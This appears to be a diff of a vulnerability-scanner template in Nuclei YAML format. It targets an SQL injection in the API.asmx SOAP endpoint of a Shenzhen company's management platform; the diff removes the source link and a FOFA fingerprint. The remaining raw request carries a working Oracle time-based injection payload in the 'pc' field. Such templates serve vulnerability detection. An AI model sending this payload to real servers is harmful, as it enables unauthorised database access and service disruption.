@@ -3,12 +3,8 @@ info:
   name: 深大智能科技有限公司管控平台服务端 API.asmx 存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/xmvquygryfcwmz8n'
+  description: ''
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: xmvquygryfcwmz8n
-    fofa: body="ItemsControlServer.aspx"
 http:
 - raw:
   - "POST /API.asmx HTTP/1.1\nHost: {{Hostname}}\nContent-Type: text/xml; charset=utf-8\nContent-Length: length\nSOAPAction: \"http://tempuri.org/getPerformInfo\"\n\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soap:Body>\n    <getPerformInfo xmlns=\"http://tempuri.org/\">\n      <pc>' OR 4155=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)-- AodC</pc>\n      <isa>string</isa>\n    </getPerformInfo>\n  </soap:Body>\n</soap:Envelope>"
